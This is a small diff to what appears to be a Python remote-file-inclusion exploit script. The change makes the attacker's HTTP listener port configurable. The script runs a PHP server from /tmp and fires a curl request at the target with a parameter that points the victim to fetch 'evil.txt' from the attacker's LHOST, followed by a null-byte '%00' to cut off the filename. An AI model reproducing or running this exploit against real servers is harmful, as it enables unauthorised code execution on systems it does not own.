@@ -35,6 +35,11 @@ def signal_handler(signal, frame):
     sys.exit()
 signal.signal(signal.SIGINT, signal_handler)
 
+# Let user override default port.
+if os.getenv('HTTP_PORT') != None:
+    HTTP_PORT = os.getenv('HTTP_PORT')
+else:
+    HTTP_PORT = '8000'
 
 def build_payload():
 
@@ -47,13 +52,13 @@ def build_payload():
 def HttpListener():
 
     os.chdir('/tmp')
-    os.system('php -S 0.0.0.0:8000')
-    print("[+] HTTP Listen = 8000")
-
-
+    print("[+] HTTP Listen = %s" % HTTP_PORT)
+    os.system('php -S 0.0.0.0:%s' % HTTP_PORT)
+    
 def exploit():
     time.sleep(5)
-    _payload = 'curl --insecure -s %s=http://%s:8000/evil.txt' % (HOST, LHOST)
+    print('[+] Exploit')
+    _payload = 'curl --insecure -s %s=http://%s:%s/evil.txt' % (HOST, LHOST, HTTP_PORT)
     _payload += '%00'
     os.system(_payload)
 
